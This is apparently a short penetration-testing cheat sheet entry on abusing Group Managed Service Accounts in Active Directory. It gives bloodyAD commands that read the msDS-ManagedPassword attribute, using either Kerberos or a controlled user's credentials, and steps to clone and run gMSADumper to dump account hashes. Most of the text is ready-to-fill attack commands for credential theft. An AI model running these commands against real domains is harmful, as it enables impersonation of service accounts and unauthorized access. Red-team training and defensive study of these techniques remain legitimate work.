Allows attacker to impersonate the Group Managed Service Account.

Read password using Kerberos authentication:
```
bloodyAD --domain <domain> -k --dc-ip <ip> --host dc01.<domain> --dns <ip> get object '<gmsausername>' --attr msDS-ManagedPassword
```

Read password using username and password of the privileged user:
```
bloodyAD --domain <domain> -u <controlledUser> -p <pass> --dc-ip <dcIP> --host dc01.<domain> --dns <dcIP> get object '<targetUsername>' --attr msDS-ManagedPassword
```

{
### Alternatively use gMSADumper
Clone the git repository for gMSADumper and use it essentially like Kerberoasting to automatically dump all possible hashes

Clone the repository:
```
git clone https://github.com/micahvandeusen/gMSADumper
```

Dump hashes using either python or python3:
```
python3 gMSADumper.py -u <username> -p <password> -d <domain>
```
}

